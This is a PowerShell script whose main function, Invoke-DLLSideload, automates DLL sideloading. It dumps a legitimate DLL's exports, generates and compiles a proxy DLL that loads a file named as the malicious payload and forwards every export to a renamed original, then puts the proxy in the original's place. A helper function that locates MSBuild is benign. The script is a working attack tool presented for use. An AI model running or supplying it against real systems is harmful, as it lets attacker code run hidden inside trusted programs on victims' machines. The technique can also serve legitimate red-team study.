#Ripped from https://alastaircrabtree.com/how-to-find-latest-version-of-msbuild-in-powershell/
Function Find-MsBuild([int] $MaxVersion = 2017)
{
    $agentPath = "$Env:programfiles (x86)\Microsoft Visual Studio\2017\BuildTools\MSBuild\15.0\Bin\msbuild.exe"
    $devPath = "$Env:programfiles (x86)\Microsoft Visual Studio\2017\Enterprise\MSBuild\15.0\Bin\msbuild.exe"
    $proPath = "$Env:programfiles (x86)\Microsoft Visual Studio\2017\Professional\MSBuild\15.0\Bin\msbuild.exe"
    $communityPath = "$Env:programfiles (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\msbuild.exe"
    $fallback2015Path = "${Env:ProgramFiles(x86)}\MSBuild\14.0\Bin\MSBuild.exe"
    $fallback2013Path = "${Env:ProgramFiles(x86)}\MSBuild\12.0\Bin\MSBuild.exe"
    $fallbackPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319"
		
    If ((2017 -le $MaxVersion) -And (Test-Path $agentPath)) { return $agentPath } 
    If ((2017 -le $MaxVersion) -And (Test-Path $devPath)) { return $devPath } 
    If ((2017 -le $MaxVersion) -And (Test-Path $proPath)) { return $proPath } 
    If ((2017 -le $MaxVersion) -And (Test-Path $communityPath)) { return $communityPath } 
    If ((2015 -le $MaxVersion) -And (Test-Path $fallback2015Path)) { return $fallback2015Path } 
    If ((2013 -le $MaxVersion) -And (Test-Path $fallback2013Path)) { return $fallback2013Path } 
    If (Test-Path $fallbackPath) { return $fallbackPath } 
        
    throw "Unable to find msbuild!"
}


 
Function Invoke-DLLSideload([string] $maliciousDLL = "payload.dll" , [string] $OriginalInDLL = "original.dll" )
{
##Generate temp xml file name
$xmlFileOut = [System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.xml'

##Location of the DLL source file that we will write to
$dllSourceOut = "DllCompiler\DllCompiler\DllCompiler.cpp"

##Location of the original DLL path
#$OriginalInDLL =  [string](Get-Location) + "\" + $originalDLL

##The the original DLL will be named 
$originalOutDLL = [string](Get-Location) + "\" + [string]([System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.dll')

##Location of the project sln file to compile
$dllTempSln = [string](Get-Location) + "\DllCompiler\DllCompiler.sln"

##Location of output DLL when compiled 
$outPutDLL = [string](Get-Location) + "\DllCompiler\Debug\DllCompiler.dll"

Write-Host "[+] Dumping function from DLL $OriginalInDLL into $xmlFileOut"

#Extract DLL function calls from the supplied DLL , dump data into xml FILE
.\dllexp.exe /from_files $OriginalInDLL  /ScanExports 1 /sxml $xmlFileOut | Out-Null

Write-Host "[+] Waiting for XML file to be created"
#Just to be sure it's done
Start-Sleep -s 2

Write-Host "[+] Backing up the and renaming the original DLL.."
#Rename the original DLL to match the one refferd to inside the generated one
Copy-Item -Path $OriginalInDLL -Destination $originalOutDLL

Move-Item -Path $OriginalInDLL -Destination ($OriginalInDLL + ".bak")

Write-Host "[+] Reading functions from XML dump"
#Read XML data
[xml]$xmldata = Get-Content -Path $xmlFileOut 

Write-Host "[+] Clearing $dllSourceOut for old content"
#Empty the .cpp file
Out-File -FilePath $dllSourceOut

Write-Host "[+] Parsing and writing code into $dllSourceOut"
#Parse and print into C code
"#include `"stdafx.h`" `n" | Out-File -FilePath $dllSourceOut -Append

"HINSTANCE hDll = LoadLibraryA(`"$([System.IO.Path]::GetFileNameWithoutExtension($maliciousDLL) + ".dll")`");`n" | Out-File -FilePath $dllSourceOut -Append

$counter = 0
$xmldata.exported_functions_list | ForEach-Object {
	$_.item | ForEach-Object {
		$counter++
		"`#pragma comment(linker, `"/export:$($_.function_name)=$([System.IO.Path]::GetFileNameWithoutExtension($originalOutDLL)).$($_.function_name),`@$($counter)`")" | Out-File -FilePath $dllSourceOut -Append

	}
}

Write-Host "[+] Removing the XML dump"
#Remove the XML file, don't need it anymore
Remove-Item -Path $xmlFileOut

Write-Host "[+] Compiling proxy DLL"
#build the project
.$(Find-MsBuild) $dllTempSln /p:Platform=x86 | Out-Null

Write-Host "[+] Moving the compiled DLL into directory"

#Move the compiled DLL so it matches the originl input DLL
Move-Item -Path $outPutDLL -Destination $OriginalInDLL

}


